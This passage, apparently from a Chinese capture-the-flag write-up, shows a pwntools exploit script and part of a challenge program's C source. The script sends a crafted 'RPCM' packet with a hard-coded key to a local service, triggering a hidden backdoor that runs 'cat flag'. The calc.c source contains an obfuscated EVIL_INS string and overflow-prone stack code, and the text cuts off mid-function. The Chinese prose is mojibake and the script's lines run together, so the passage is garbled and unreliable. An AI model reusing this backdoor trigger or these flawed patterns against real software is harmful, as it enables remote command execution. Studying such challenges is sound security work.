}}</code></pre><p>æœ€ç»ˆè„šæœ¬å¦‚ä¸‹ï¼š<br>exp.py</p><pre><code>from pwn import *import ospayload=&quot;cat flag&quot;key=&quot;12345678-6666-2333-5555-deadbeef1234&quot;backdoor=b&#39;RPCM\x00\x00\x00\x0c\x00\x00\x00\x06&#39;+p32(len(key))[::-1]+key+p32(len(payload))[::-1]+payloadr = remote(&#39;127.0.0.1&#39;, 1337)r.sendline(backdoor)print r.recvline()r.close()</code></pre></blockquote><p>calc.cç¨‹åºä»£ç å¦‚ä¸‹ï¼š</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/socket.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;netdb.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdbool.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;uuid/uuid.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;netinet/in.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;arpa/inet.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/shm.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;queue></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;map></span></span><span class="token macro property">#<span class="token directive keyword">define</span> BUF_SIZE 0x100</span><span class="token macro property">#<span class="token directive keyword">define</span> LENGTH 100</span>using namespace std<span class="token punctuation">;</span><span class="token keyword">typedef</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span> byte<span class="token punctuation">;</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> top<span class="token punctuation">;</span>    <span class="token keyword">long</span> <span class="token keyword">long</span> pool<span class="token punctuation">[</span>LENGTH<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span> stack<span class="token punctuation">;</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> Data<span class="token punctuation">{</span>  string corr_id<span class="token punctuation">;</span>  string res<span class="token punctuation">;</span><span class="token punctuation">}</span> Data<span class="token punctuation">;</span><span class="token keyword">typedef</span> queue<span class="token operator">&lt;</span>Data<span class="token operator">></span> Q<span class="token punctuation">;</span><span class="token keyword">typedef</span> map<span class="token operator">&lt;</span>string<span class="token punctuation">,</span>Q<span class="token operator">></span> MQ<span class="token punctuation">;</span>map<span class="token operator">&lt;</span>string<span class="token punctuation">,</span>Q<span class="token operator">></span><span class="token punctuation">:</span><span class="token punctuation">:</span>iterator it_find<span class="token punctuation">;</span>byte RECV_MAGIC<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'R'</span><span class="token punctuation">,</span><span class="token string">'P'</span><span class="token punctuation">,</span><span class="token string">'C'</span><span class="token punctuation">,</span><span class="token string">'M'</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">char</span><span class="token operator">*</span> EVIL_INS<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">"1%\x1dqiE\xbd\x99\x95\xf9\xd0\xcb\"\x06pjC\xb4\xb3\x80\xf9\xd6\xcf&lt;LZ7\t\xe6\xfe\xd7\xaf\xd1\xc5=\x11"</span><span class="token punctuation">;</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token operator">*</span> <span class="token function">p32</span><span class="token punctuation">(</span><span class="token keyword">int</span> value<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token operator">*</span> result<span class="token punctuation">;</span>  result <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  result<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>byte<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>value <span class="token operator">>></span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  result<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>byte<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>value <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  result<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>byte<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>value <span class="token operator">>></span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  result<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>byte<span class="token punctuation">)</span><span class="token punctuation">(</span>value <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">char</span><span class="token operator">*</span> <span class="token function">StrTrim</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> pStr<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">char</span> <span class="token operator">*</span>pTmp <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span>pStr<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span>pTmp<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>pStr<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> mark <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span>pStr<span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>pStr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">' '</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            pTmp<span class="token punctuation">[</span>mark<span class="token punctuation">]</span> <span class="token operator">=</span> pStr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>            mark<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    pTmp<span class="token punctuation">[</span>mark<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'\x00'</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> pTmp<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">myatoi</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> buf<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">*</span>buf<span class="token punctuation">)</span> <span class="token punctuation">{</span>        sum <span class="token operator">=</span> sum <span class="token operator">*</span> <span class="token number">10</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token operator">*</span>buf <span class="token operator">-</span> <span class="token string">'0'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        buf<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> sum<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">read_str</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> buf<span class="token punctuation">,</span> <span class="token keyword">int</span> n<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> t <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> n<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>buf<span class="token punctuation">[</span>t <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'\n'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        buf<span class="token punctuation">[</span>t <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'\x00'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    buf<span class="token punctuation">[</span>t<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'\x00'</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> t<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">input_pass</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> buf<span class="token punctuation">,</span> <span class="token keyword">int</span> size<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> ret <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> size<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">char</span> c <span class="token operator">=</span> buf<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token punctuation">(</span>c <span class="token operator">>=</span> <span class="token string">'0'</span> <span class="token operator">&amp;&amp;</span> c <span class="token operator">&lt;=</span> <span class="token string">'9'</span><span class="token punctuation">)</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'+'</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'-'</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'*'</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'/'</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'\x00'</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'('</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">')'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            ret <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> size<span class="token number">-1</span><span class="token punctuation">;</span> i<span class="token operator">=</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">char</span> c1 <span class="token operator">=</span> buf<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">char</span> c2 <span class="token operator">=</span> buf<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>c1 <span class="token operator">==</span> <span class="token string">'+'</span> <span class="token operator">||</span> c1 <span class="token operator">==</span> <span class="token string">'-'</span> <span class="token operator">||</span> c1 <span class="token operator">==</span> <span class="token string">'*'</span> <span class="token operator">||</span> c1 <span class="token operator">==</span> <span class="token string">'/'</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>          <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>c2 <span class="token operator">>=</span> <span class="token string">'0'</span> <span class="token operator">&amp;&amp;</span> c2 <span class="token operator">&lt;=</span> <span class="token string">'9'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            ret <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>c2 <span class="token operator">==</span> <span class="token string">'+'</span> <span class="token operator">||</span> c2 <span class="token operator">==</span> <span class="token string">'-'</span> <span class="token operator">||</span> c2 <span class="token operator">==</span> <span class="token string">'*'</span> <span class="token operator">||</span> c2 <span class="token operator">==</span> <span class="token string">'/'</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>          <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>c1 <span class="token operator">>=</span> <span class="token string">'0'</span> <span class="token operator">&amp;&amp;</span> c1 <span class="token operator">&lt;=</span> <span class="token string">'9'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            ret <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> ret<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">push</span><span class="token punctuation">(</span>stack<span class="token operator">*</span> s<span class="token punctuation">,</span> <span class="token keyword">int</span> value<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>s<span class="token operator">-></span>top <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        s<span class="token operator">-></span>top<span class="token operator">--</span><span class="token punctuation">;</span>        s<span class="token operator">-></span>pool<span class="token punctuation">[</span>s<span class="token operator">-></span>top<span class="token punctuation">]</span> <span class="token operator">=</span> value<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">priority</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> ret<span class="token punctuation">;</span>    <span class="token keyword">switch</span> <span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">case</span> <span class="token string">'('</span><span class="token punctuation">:</span>            ret <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'*'</span><span class="token punctuation">:</span>        <span class="token keyword">case</span> <span class="token string">'/'</span><span class="token punctuation">:</span>            ret <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'+'</span><span class="token punctuation">:</span>        <span class="token keyword">case</span> <span class="token string">'-'</span><span class="token punctuation">:</span>            ret <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">')'</span><span class="token punctuation">:</span>            ret<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token number">0</span><span class="token punctuation">:</span>            ret <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>            ret <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> ret<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">deal_data</span><span class="token punctuation">(</span>stack<span class="token operator">*</span> array<span class="token punctuation">,</span> stack<span class="token operator">*</span> opt<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">char</span> c <span class="token operator">=</span> opt<span class="token operator">-></span>pool<span class="token punctuation">[</span>opt<span class="token operator">-></span>top<span class="token punctuation">]</span><span class="token punctuation">;</span>    opt<span class="token operator">-></span>top<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token keyword">long</span> <span class="token keyword">long</span> a <span class="token operator">=</span> array<span class="token operator">-></span>pool<span class="token punctuation">[</span>array<span class="token operator">-></span>top<span class="token punctuation">]</span><span class="token punctuation">;</span>    array<span class="token operator">-></span>top<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token keyword">long</span> <span class="token keyword">long</span> b <span class="token operator">=</span> array<span class="token operator">-></span>pool<span class="token punctuation">[</span>array<span class="token operator">-></span>top<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">switch</span> <span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">case</span> <span class="token string">'+'</span><span class="token punctuation">:</span>            array<span class="token operator">-></span>pool<span class="token punctuation">[</span>array<span class="token operator">-></span>top<span class="token punctuation">]</span> <span class="token operator">=</span> a <span class="token operator">+</span> b<span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'-'</span><span class="token punctuation">:</span>            array<span class="token operator">-></span>pool<span class="token punctuation">[</span>array<span class="token operator">-></span>top<span class="token punctuation">]</span> <span class="token operator">=</span> b <span class="token operator">-</span> a<span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'*'</span><span class="token punctuation">:</span>            array<span class="token operator">-></span>pool<span class="token punctuation">[</span>array<span class="token operator">-></span>top<span class="token punctuation">]</span> <span class="token operator">=</span> a <span class="token operator">*</span> b<span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'/'</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>                array<span class="token operator">-></span>pool<span class="token punctuation">[</span>array<span class="token operator">-></span>top<span class="token punctuation">]</span> <span class="token operator">=</span> b <span class="token operator">/</span> a<span class="token punctuation">;</span>            <span class="token keyword">else</span>                array<span class="token operator">-></span>pool<span class="token punctuation">[</span>array<span class="token operator">-></span>top<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xFFFFFFFF</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">default</span><span class="token punctuation">:</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">calc</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> expr<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> result<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> <span class="token operator">*</span>temp<span class="token punctuation">,</span> <span class="token operator">*</span>str<span class="token punctuation">;</span>  <span class="token keyword">struct</span> <span class="token punctuation">{</span>        <span class="token keyword">char</span> dest<span class="token punctuation">[</span>BUF_SIZE<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">char</span> buf<span class="token punctuation">[</span>BUF_SIZE<span class="token punctuation">]</span><span class="token punctuation">;</span>        stack opt<span class="token punctuation">;</span>        stack array<span class="token punctuation">;</span>    <span class="token punctuation">}</span> var<span class="token punctuation">;</span>  var<span class="token punctuation">.</span>array<span class="token punctuation">.</span>top <span class="token operator">=</span> LENGTH<span class="token punctuation">;</span>  var<span class="token punctuation">.</span>opt<span class="token punctuation">.</span>top <span class="token operator">=</span> LENGTH<span class="token punctuation">;</span>  <span class="token function">push</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>var<span class="token punctuation">.</span>opt<span class="token punctuation">,</span> <span class="token number">0xFFFFFFFF</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">char</span><span class="token operator">*</span> tmp <span class="token operator">=</span> <span class="token function">StrTrim</span><span class="token punctuation">(</span>expr<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span>var<span class="token punctuation">.</span>buf<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>BUF_SIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memcpy</span><span class="token punctuation">(</span>var<span class="token punctuation">.</span>buf<span class="token punctuation">,</span>tmp<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">int</span> size <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">input_pass</span><span class="token punctuation">(</span>var<span class="token punctuation">.</span>buf<span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>var<span class="token punctuation">.</span>buf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  str <span class="token operator">=</span> var<span class="token punctuation">.</span>buf<span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span>str <span class="token operator">-</span> var<span class="token punctuation">.</span>buf <span class="token operator">&lt;</span> size<span class="token punctuation">)</span>   <span class="token punctuation">{</span>    temp <span class="token operator">=</span> var<span class="token punctuation">.</span>dest<span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>str <span class="token operator">-</span> var<span class="token punctuation">.</span>buf <span class="token operator">&lt;</span> size <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span>str <span class="token operator">>=</span> <span class="token string">'0'</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span>str <span class="token operator">&lt;=</span> <span class="token string">'9'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token operator">*</span>temp <span class="token operator">=</span> <span class="token operator">*</span>str<span class="token punctuation">;</span>        temp<span class="token operator">++</span><span class="token punctuation">;</span>        str<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token operator">*</span>temp <span class="token operator">=</span> <span class="token string">'\x00'</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">*</span>var<span class="token punctuation">.</span>dest<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> num <span class="token operator">=</span> <span class="token function">myatoi</span><span class="token punctuation">(</span>var<span class="token punctuation">.</span>dest<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">push</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>var<span class="token punctuation">.</span>array<span class="token punctuation">,</span> num<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> var<span class="token punctuation">.</span>opt<span class="token punctuation">.</span>pool<span class="token punctuation">[</span>var<span class="token punctuation">.</span>opt<span class="token punctuation">.</span>top<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'('</span> <span class="token operator">||</span> <span class="token function">priority</span><span class="token punctuation">(</span>var<span class="token punctuation">.</span>opt<span class="token punctuation">.</span>pool<span class="token punctuation">[</span>var<span class="token punctuation">.</span>opt<span class="token punctuation">.</span>top<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token function">priority</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">*</span>str<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">*</span>str <span class="token operator">!=</span> <span class="token string">')'</span><span class="token punctuation">)</span>                                    <span class="token function">push</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>var<span class="token punctuation">.</span>opt<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">*</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">else</span>                var<span class="token punctuation">.</span>opt<span class="token punctuation">.</span>top<span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token function">deal_data</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>var<span class="token punctuation">.</span>array<span class="token punctuation">,</span> <span class="token operator">&amp;</span>var<span class="token punctuation">.</span>opt<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">*</span>str <span class="token operator">==</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    str<span class="token operator">++</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token function">sprintf</span><span class="token punctuation">(</span>result<span class="token punctuation">,</span> <span class="token string">"%lld"</span><span class="token punctuation">,</span> var<span class="token punctuation">.</span>array<span class="token punctuation">.</span>pool<span class="token punctuation">[</span>var<span class="token punctuation">.</span>array<span class="token punctuation">.</span>top<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">char</span><span class="token operator">*</span> <span class="token function">construct_result</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> key<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> length <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">char</span><span class="token operator">*</span> packet <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token punctuation">(</span>length<span class="token operator">+</span><span class="token number">12</span><span class="token operator">+</span><span class="token number">4</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span>packet<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>length<span class="token operator">+</span><span class="token number">12</span><span class="token operator">+</span><span class="token number">4</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memcpy</span><span class="token punctuation">(</span>packet<span class="token punctuation">,</span> <span class="token punctuation">(</span>byte<span class="token operator">*</span><span class="token punctuation">)</span><span class="token 